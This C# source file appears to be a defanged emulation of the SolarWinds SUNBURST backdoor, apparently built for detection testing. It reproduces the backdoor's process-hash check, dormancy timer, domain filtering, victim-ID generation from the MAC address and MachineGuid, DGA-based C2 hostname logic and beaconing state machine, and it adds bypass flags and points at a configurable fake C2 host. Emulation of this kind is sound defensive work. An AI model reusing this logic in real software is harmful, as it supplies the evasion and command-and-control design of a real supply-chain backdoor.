using System;
using System.IO;
using System.Linq;
using System.Text;
using System.IO.Pipes;
using System.Threading;
using System.Management;
using System.Reflection;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Net.NetworkInformation;
using System.Text.RegularExpressions;

namespace SunBurstDefanged
{
	class Program
	{
		// DS added to bypass
		private static bool bypassn = true;  // TO prevent you from shooting your foot.
		private static bool forcea = false;
		private static bool forceb = false;
		private static bool forcec = false;
		private static bool forced = false;
		private static bool forcee = false;
		private static bool forcef = false;
		private static bool forceg = false;
		private static bool forceh = false;


		private static bool bypassw = false;
		private static volatile bool _isAlive = false;
		private static readonly object _isAliveLock = new object();
		private static ReportStatus status = ReportStatus.New;
		private static string domain4 = null;
		private static byte[] userId = null;


		// (get) Token: 0x06000047 RID: 71 RVA: 0x00004254 File Offset: 0x00002454
		public static bool IsAlive
		{
			get
			{
				object isAliveLock = _isAliveLock;
				bool result;
				lock (isAliveLock)
				{
					if (_isAlive)
					{
						result = true;
					}
					else
					{
						_isAlive = true;
						result = false;
					}
				}
				return result;
			}
		}

		static void Main(string[] args)
		{
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - DEFANGED-SUNBURST v1.1 ==================== ET Lownoise 2020");
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - (-h for Help)");

			bool bypassb = false;
			bool bypasst = false;
			bool bypasss = false;
			Settings.bypassx = false;
			bool bypassd = false;

			foreach (string arg in args)
			{
				if (String.Equals(arg, "-h"))
				{

					Console.WriteLine("     Example:   fakesunburst.exe -a www.something.com");
					Console.WriteLine("     Options:");
					Console.WriteLine("     -----------------------------------");
					Console.WriteLine("     -a	[host] Use this host as C2 test and DNS resolution. In the backdoor it ");
					Console.WriteLine("	        uses 'api.solarwinds.com' and {DGA}.avsvmcloud.com however by default in");
					Console.WriteLine("	        this tool it points to 'localhost' and needs to be changed wiht this flag.");
					Console.WriteLine("     -b	Bypass businesslayerhost check");
					Console.WriteLine("     -t	Bypass file timestamp check");
					Console.WriteLine("     -w	Bypass DNS resolve check");
					Console.WriteLine("     -s	Bypass status check");
					Console.WriteLine("     -x	Bypass time delays");
					Console.WriteLine("     -d	Bypass domain check");
					Console.WriteLine("     -r	Bypass drivers/processes check");
					Console.WriteLine("     -n	Bypass C2 hostname check");
					Console.WriteLine("     -1	Force Netbios Family");
					Console.WriteLine("     -2	Force Implink Family");
					Console.WriteLine("     -3	Force Atm Family");
					Console.WriteLine("     -4	Force Ipx Family");
					Console.WriteLine("     -5	Force InterNetwork Family");
					Console.WriteLine("     -6	Force InternetworkV6 Family");
					Console.WriteLine("     -7	Force Unknown Family");
					Console.WriteLine("     -8	Force Error Family");
					Console.WriteLine("     -p	Dont print list of processes");
					Console.WriteLine("     -i	Dont print list of services");
					Console.WriteLine("     -y	Dont print list of drivers");
					Console.WriteLine("     -m	Dont print list of network/family");
					Console.WriteLine("     -u	Force scan of connfiguration");
					Console.WriteLine("     -h	This help");
					return;
				}
				if (String.Equals(arg, "-b"))
				{
					bypassb = true;
				}
				if (String.Equals(arg, "-t"))
				{
					bypasst = true;
				}
				if (String.Equals(arg, "-s"))
				{
					bypasst = true;
				}
				if (String.Equals(arg, "-x"))
				{
					Settings.bypassx = true;
				}
				if (String.Equals(arg, "-d"))
				{
					bypassd = true;
				}
				if (String.Equals(arg, "-r"))
				{
					Settings.bypassr = true;
				}
				if (String.Equals(arg, "-n"))
				{
					bypassn = true;
				}
				if (String.Equals(arg, "-1"))
				{
					forcea = true;
				}
				if (String.Equals(arg, "-2"))
				{
					forceb = true;
				}
				if (String.Equals(arg, "-3"))
				{
					forcec = true;
				}
				if (String.Equals(arg, "-4"))
				{
					forced = true;
				}
				if (String.Equals(arg, "-5"))
				{
					forcee = true;
				}
				if (String.Equals(arg, "-6"))
				{
					forcef = true;
				}
				if (String.Equals(arg, "-7"))
				{
					forceg = true;
				}
				if (String.Equals(arg, "-8"))
				{
					forceh = true;
				}
				if (String.Equals(arg, "-p"))
				{
					Settings.printp = true;
				}
				if (String.Equals(arg, "-i"))
				{
					Settings.printi = true;
				}
				if (String.Equals(arg, "-y"))
				{
					Settings.printy = true;
				}
				if (String.Equals(arg, "-m"))
				{
					Settings.printm = true;
				}
				if (String.Equals(arg, "-u"))
				{
					Settings.forceu = true;
				}
				if (String.Equals(arg, "-a"))
				{
					Settings.fakehost = args[Array.IndexOf(args, "-a") + 1];

				}
				if (String.Equals(arg, "-w"))
				{
					bypassw = true;
				}
			}

			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Will be using '" + Settings.fakehost + "' as fake C2 and test connectivity via DNS resolution");
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Initializing --  Initialize()");

			try
			{
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Trying to get Current Process Name and compare to hash of 'solarwinds.businesslayerhost'.");
				// solarwinds.businesslayerhost
				if ((Utilities.GetHash(Process.GetCurrentProcess().ProcessName.ToLower()) == 17291806236368054941UL) || bypassb)
				{
					Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Check succeed sunburst running from 'solarwinds.businesslayerhost' ");
					DateTime lastWriteTime = File.GetLastWriteTime(Assembly.GetExecutingAssembly().Location);
					Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Backdoor file last write/modified:" + lastWriteTime);

					// Select randomly from 288 to 336 hours (12 to 14 days).
					int hours = new Random().Next(288, 336);

					// Technical Note: Actually, there is a minor bug here; because Random.Next(min, max) selects up to but not including the max value,
					// the true range it may select from is 288 to 335 hours, so from 12 days to 13 days and 23 hours. 
					// This detail is probably unimportant , but I thought I would mention it.

					Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Random number of hours between 288 and 336:" + hours + ". This is " + hours / 24 + "days.");
					if ((DateTime.Now.CompareTo(lastWriteTime.AddHours((double)hours)) >= 0) || bypasst)
					{
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Check succeed sunburst file was modified more than " + hours + "hours ago. This is " + hours / 24 + "days ago.");

						// Creates a unique named pipe to prevent multiple instances from running
						Settings.instance = new NamedPipeServerStream(Settings.appId);

						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - New Named pipe with pipe name set to appId static value: " + Settings.appId);

						ConfigManager.ReadReportStatus(out status);

						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Backdoor Current status: " + status);

						if ((status != ReportStatus.Truncate) || bypasss)
						{
							Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Check succeed backdoor status is different that status 'truncate'");
							
							Utilities.DelayMin(0, 0);
							domain4 = IPGlobalProperties.GetIPGlobalProperties().DomainName;

							Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Domain name is " + domain4);

							if ((!string.IsNullOrEmpty(domain4) && !IsNullOrInvalidName(domain4)) || bypassd)
							{
								Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Check succeed Domain name is valid: " + domain4);
								
								Utilities.DelayMin(0, 0);

								if (GetOrCreateUserID(out userId))
								{
									Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Check succeed to create unique identificator.");
									
									Utilities.DelayMin(0, 0);
									
									Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Read backdoor config services status");
									
									ConfigManager.ReadServiceStatus(false);
									
									Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - **** Almost ready to hit the fan");
									
									Update();									
									Settings.instance.Close();
									
									Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Sunburst finished.");
								}
								else
								{
									Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Check failed to create unique identificator.");
								}
							}
							else
							{
								Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Check failed domain is invalid. [-d to bypass]");
							}
						}
						else
						{
							Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Check failed backdoor status is set to 'truncate'. [-s to bypass]");
						}
					}
					else
					{
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Check failed sunburst file was modified less than " + hours + "hours ago. [-t to bypass]");
					}
				}
				else
				{
					Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Check failed sunburst not running from 'solarwinds.businesslayerhost' runnin from " + Process.GetCurrentProcess().ProcessName.ToLower() + "[-b to bypass]");
				}
			}
			catch (Exception)
			{
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Exception error");
			}
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - FAKESUNBURST EXIT");
		}

		private static bool UpdateNotification()
		{
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Entered UpdateNotification()");
			
			int num = 3;
			
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - UpdateNotification is done " + num + "times");
			
			while (num-- > 0)
			{
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - UpdateNotification round" + num);
				
				Utilities.DelayMin(0, 0);

				if (ProcessTracker.TrackProcesses(true))
				{
					Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Backdoor TrackProcesses() complete and check now returns false");
					return false;
				}

				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Backdoor CheckServerConnection() to the Internet (Actually it just checks if it can resolve)");
				if (DnsHelper.CheckServerConnection(Settings.fakehost) || bypassw)
				{
					Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Backdoor CheckServerConnection() passed.");
					return true;
				}
			}

			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - CheckServerConnection() failed unable to resolve: " + Settings.fakehost + " [Maybe use -a host] or [-w to bypass check]");
			return false;
		}

		private static void Update()
		{
			bool flag = false;
			CryptoHelper cryptoHelper = new CryptoHelper(userId, domain4);
			HttpHelper httpHelper = null;
			Thread thread = null;
			bool flag2 = true;
			AddressFamilyEx addressFamilyEx = AddressFamilyEx.Unknown;
			int num = 0;
			bool flag3 = true;
			DnsRecords dnsRecords = new DnsRecords();
			Random random = new Random();
			int a = 0;

			if (!UpdateNotification())
			{
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - UpdateNotification() failed.");
				return;
			}

			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - UpdateNotification() complete.");
			Settings.svcListModified2 = false;
			int num2 = 1;
			while (num2 <= 3 && !flag)
			{
				Utilities.DelayMin(dnsRecords.A, dnsRecords.A);

				if (!ProcessTracker.TrackProcesses(true))
				{
					Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - TrackProcesses() complete.");
					if (Settings.svcListModified1)
					{
						flag3 = true;
					}
					num = (Settings.svcListModified2 ? (num + 1) : 0);
					string hostName;
					if (status == ReportStatus.New)
					{
						hostName = ((addressFamilyEx == AddressFamilyEx.Error) ? cryptoHelper.GetCurrentString() : cryptoHelper.GetPreviousString(out flag2));
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - hostName var set to: " + hostName);
					}
					else
					{
						if (status != ReportStatus.Append)
						{
							break;
						}
						hostName = (flag3 ? cryptoHelper.GetNextStringEx(dnsRecords.dnssec) : cryptoHelper.GetNextString(dnsRecords.dnssec));
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - hostName var set to: " + hostName);
					}
					Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Backdoor is pulling the dnsRecords of C2: " + dnsRecords);

					if (bypassn)
					{
						hostName = Settings.fakehost;
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Bypassing original C2 hostname and instead will be using " + hostName);
					}
					addressFamilyEx = DnsHelper.GetAddressFamily(hostName, dnsRecords);
					Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - AddressFamily is (-1 Netbios, -2 ImpLink, -3 Atm, -4 Ipx, -5 InterNetwork, -6 InterNetworkV6, -7 Unknown, -8 Error) : " + addressFamilyEx + " [-1-8 to force Family]");

					if (forcea)
					{
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Forcing Netbios family");
						addressFamilyEx = AddressFamilyEx.NetBios;
						dnsRecords.cname = Settings.fakehost;
					}
					if (forceb)
					{
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Forcing ImpLink family");
						addressFamilyEx = AddressFamilyEx.ImpLink;
					}
					if (forcec)
					{
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Forcing Atm family");
						addressFamilyEx = AddressFamilyEx.Atm;
					}
					if (forced)
					{
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Forcing Ipx family");
						addressFamilyEx = AddressFamilyEx.Ipx;
					}
					if (forcee)
					{
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Forcing InterNetwork family");
						addressFamilyEx = AddressFamilyEx.InterNetwork;
					}
					if (forcef)
					{
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Forcing InterNetworkV6 family");
						addressFamilyEx = AddressFamilyEx.InterNetworkV6;
					}
					if (forceg)
					{
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Forcing Unknown family");
						addressFamilyEx = AddressFamilyEx.Unknown;
					}
					if (forceh)
					{
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Forcing Error family");
						addressFamilyEx = AddressFamilyEx.Error;
					}

					switch (addressFamilyEx)
					{
						case AddressFamilyEx.NetBios:
							if (status == ReportStatus.Append)
							{
								Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Backdoor status is APPEND");
								flag3 = false;
								if (dnsRecords.dnssec)
								{
									a = dnsRecords.A;
									dnsRecords.A = random.Next(1, 3);
								}
							}
							if (status == ReportStatus.New && flag2)
							{
								Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Backdoor status is NEW");
								status = ReportStatus.Append;
								ConfigManager.WriteReportStatus(status);
							}
							if (!string.IsNullOrEmpty(dnsRecords.cname))
							{
								Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - HTTPHELPER");
								dnsRecords.A = a;
								HttpHelper.Close(httpHelper, thread);
								httpHelper = new HttpHelper(userId, dnsRecords);
								if (!Settings.svcListModified2 || num > 1)
								{
									Settings.svcListModified2 = false;
									thread = new Thread(new ThreadStart(httpHelper.Initialize))
									{
										IsBackground = true
									};
									thread.Start();
								}
							}
							num2 = 0;
							break;
						case AddressFamilyEx.ImpLink:
						case AddressFamilyEx.Atm:
							ConfigManager.WriteReportStatus(ReportStatus.Truncate);
							ProcessTracker.SetAutomaticMode();
							flag = true;
							break;
						case AddressFamilyEx.Ipx:
							if (status == ReportStatus.Append)
							{
								ConfigManager.WriteReportStatus(ReportStatus.New);
							}
							flag = true;
							break;
						case AddressFamilyEx.InterNetwork:
						case AddressFamilyEx.InterNetworkV6:
						case AddressFamilyEx.Unknown:
							goto IL_1F7;
						case AddressFamilyEx.Error:
							dnsRecords.A = random.Next(420, 540);
							Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Random dnsRecord generated.");
							break;
						default:
							goto IL_1F7;
					}
				IL_1F9:
					num2++;
					continue;
				IL_1F7:
					flag = true;
					goto IL_1F9;
				}
				break;
			}
			HttpHelper.Close(httpHelper, thread);
		}

		private static string ReadDeviceInfo()
		{
			try
			{
				return (from nic in NetworkInterface.GetAllNetworkInterfaces()
						where nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback
						select nic.GetPhysicalAddress().ToString()).FirstOrDefault<string>();
			}
			catch (Exception)
			{
			}
			return null;
		}

		private static bool GetOrCreateUserID(out byte[] hash64)
		{
			string text = ReadDeviceInfo();
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Device info: " + text);

			hash64 = new byte[8];
			Array.Clear(hash64, 0, hash64.Length);
			if (text == null)
			{
				return false;
			}
			text += domain4;
			try
			{
				// HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography
				// MachineGuid
				text += RegistryHelper.GetValue(ZipHelper.Unzip("8/B2jYz38Xd29In3dXT28PRzjQn2dwsJdwxyjfHNTC7KL85PK4lxLqosKMlPL0osyKgEAA=="), ZipHelper.Unzip("801MzsjMS3UvzUwBAA=="), "");
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Registry/MachineGuid info: " + text);
			}
			catch
			{
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Error GetOrCreateUserID");
			}
			using (MD5 md = MD5.Create())
			{
				byte[] bytes = Encoding.ASCII.GetBytes(text);
				byte[] array = md.ComputeHash(bytes);
				if (array.Length < hash64.Length)
				{
					return false;
				}
				for (int i = 0; i < array.Length; i++)
				{
					byte[] array2 = hash64;
					int num = i % hash64.Length;
					array2[num] ^= array[i];
				}
			}
			return true;
		}

		private static bool IsNullOrInvalidName(string domain4)
		{
			string[] array = domain4.ToLower().Split(new char[]
			{
				'.'
			});
			if (array.Length >= 2)
			{
				string s = array[array.Length - 2] + "." + array[array.Length - 1];
				foreach (ulong num in Settings.patternHashes)
				{
					if (Utilities.GetHash(s) == num)
					{
						return true;
					}
				}
			}
			foreach (string pattern in Settings.patternList)
			{
				if (Regex.Match(domain4, pattern).Success)
				{
					return true;
				}
			}
			return false;
		}

	}
}
